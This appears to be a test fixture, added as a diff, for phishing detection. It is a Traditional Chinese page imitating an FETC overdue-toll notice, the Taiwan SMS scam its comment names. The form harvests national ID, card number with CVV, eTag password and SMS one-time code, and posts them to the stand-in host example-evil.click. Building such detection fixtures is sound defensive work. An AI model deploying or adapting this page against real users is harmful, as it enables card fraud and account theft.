@@ -1,0 +1,99 @@
+<!doctype html>
+<!--
+  ============================================================================
+  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
+  Mimics 遠通電收 ETC 逾期催繳 scam — one of the most common Taiwan SMS-bait
+  patterns ("ETC 逾期未繳，將強制執行").
+    - Page claims 遠通電收 / ETC / eTag (TW institution hint)
+    - Cross-strait terms: 短信、激活、信息 sprinkled in
+    - Form action: cross-eTLD+1 + credit card harvest
+  ============================================================================
+-->
+<html lang="zh-Hant-TW">
+  <head>
+    <meta charset="UTF-8" />
+    <title>遠通電收 ETC — 逾期未繳通行費繳納</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body { margin:0; font-family:"Microsoft JhengHei", system-ui, sans-serif; background:#0f172a; color:#e2e8f0; min-height:100vh; }
+      header { background:#003a70; padding:14px 20px; border-bottom:3px solid #f97316; display:flex; align-items:center; gap:12px; }
+      header .logo { background:#f97316; color:#003a70; padding:6px 12px; border-radius:4px; font-weight:800; font-size:18px; }
+      .card { max-width:540px; margin:28px auto; background:#1e293b; border:1px solid #334155; padding:28px; border-radius:6px; }
+      h1 { color:#fb923c; font-size:22px; margin:0 0 12px; }
+      .warn { background:#7f1d1d; border-left:4px solid #ef4444; padding:12px 14px; margin:14px 0; font-size:14px; color:#fecaca; }
+      .summary { background:#0b1220; border:1px solid #334155; padding:14px; border-radius:4px; }
+      .summary table { width:100%; border-collapse:collapse; font-size:14px; }
+      .summary td { padding:6px 8px; border-bottom:1px solid #334155; }
+      .summary td:last-child { text-align:right; color:#fbbf24; font-weight:600; }
+      label { display:block; font-size:14px; margin:14px 0 6px; color:#cbd5e1; }
+      input { width:100%; padding:10px; border:1px solid #475569; background:#0f172a; color:#e2e8f0; border-radius:4px; box-sizing:border-box; font-size:14px; }
+      button { width:100%; margin-top:22px; background:#f97316; color:white; border:0; padding:13px; font-size:15px; font-weight:800; cursor:pointer; border-radius:4px; }
+      .small { font-size:12px; color:#94a3b8; margin-top:14px; text-align:center; }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="logo">FETC</div>
+      <div>
+        <div style="font-weight:700">遠通電收 ETC</div>
+        <div style="font-size:12px;opacity:0.85">Far Eastern Electronic Toll Collection</div>
+      </div>
+    </header>
+
+    <main class="card">
+      <h1>⚠ 您有逾期未繳之國道通行費</h1>
+
+      <p>尊貴的車主您好，</p>
+      <p>
+        系統已多次透過短信向您發送繳費信息，但目前尚未收到您的繳費紀錄。
+        為避免依《公路法》進入強制執行程序並產生額外滯納金，請於 24 小時內完成線上繳費。
+      </p>
+
+      <div class="warn">
+        ⚠ 緊急通知：若您未於期限內完成繳費，系統將自動依照默認方式註記為待強制執行案件，
+        並可能影響您下一次車輛驗車與監理服務網之激活作業。
+      </div>
+
+      <div class="summary">
+        <table>
+          <tr><td>車牌號碼</td><td>ABC-1234</td></tr>
+          <tr><td>逾期通行費</td><td>NT$ 1,847</td></tr>
+          <tr><td>滯納金</td><td>NT$ 184</td></tr>
+          <tr><td>強制執行費</td><td>NT$ 300</td></tr>
+          <tr><td><strong>應繳合計</strong></td><td><strong>NT$ 2,331</strong></td></tr>
+        </table>
+      </div>
+
+      <!-- cross-eTLD+1 form action to .click -->
+      <form action="https://fetc-pay-overdue.example-evil.click/charge" method="post">
+        <label>車主姓名</label>
+        <input type="text" name="name" required />
+
+        <label>身分證字號</label>
+        <input type="text" name="id_no" pattern="[A-Z][0-9]{9}" required />
+
+        <label>車牌號碼</label>
+        <input type="text" name="plate" value="ABC-1234" />
+
+        <label>手機號碼（用於接收短信驗證）</label>
+        <input type="tel" name="phone" required />
+
+        <label>信用卡號（用於繳費）</label>
+        <input type="text" name="card" inputmode="numeric" maxlength="19" required />
+
+        <label>到期日 (MM/YY) &nbsp;&nbsp;&nbsp;&nbsp; 安全碼 CVV</label>
+        <input type="text" name="combined" placeholder="MM/YY  CVV" required />
+
+        <label>eTag 賬號密碼（用於核對 ETC 賬戶資料）</label>
+        <input type="password" name="etag_pass" required />
+
+        <label>簡訊驗證碼</label>
+        <input type="text" name="otp" autocomplete="one-time-code" maxlength="6" required />
+
+        <button type="submit">立即繳納 NT$ 2,331</button>
+      </form>
+
+      <p class="small">© 2026 遠通電收股份有限公司 Far Eastern Electronic Toll Collection Co., Ltd.</p>
+    </main>
+  </body>
+</html>
